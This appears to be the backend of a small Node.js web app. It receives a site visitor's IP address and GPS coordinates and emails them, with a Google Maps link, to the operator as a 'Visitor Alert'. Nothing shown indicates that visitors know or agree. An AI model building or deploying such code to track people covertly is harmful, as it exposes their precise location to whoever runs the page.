const express = require("express")
const nodemailer = require("nodemailer")
require("dotenv").config()

const app = express()

app.use(express.json())
app.use(express.static("public"))

app.get("/healthz", (req, res) => {
    res.status(200).send("ok")
})

const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
})

app.post("/send-location", async (req, res) => {

    const { ip, latitude, longitude } = req.body

    const mail = {
        from: process.env.EMAIL_USER,
        to: process.env.EMAIL_USER,
        subject: "Visitor Alert",
        text: `
New Visitor

IP: ${ip}
Latitude: ${latitude}
Longitude: ${longitude}

Google Maps:
https://maps.google.com/?q=${latitude},${longitude}
`
    }

    try {
        await transporter.sendMail(mail)
        res.status(200).send("Sent")
    } catch (error) {
        console.error(error)
        res.status(500).send("Error")
    }

})

const PORT = process.env.PORT || 3000

app.listen(PORT, () => {
    console.log("Server running on port", PORT)
})
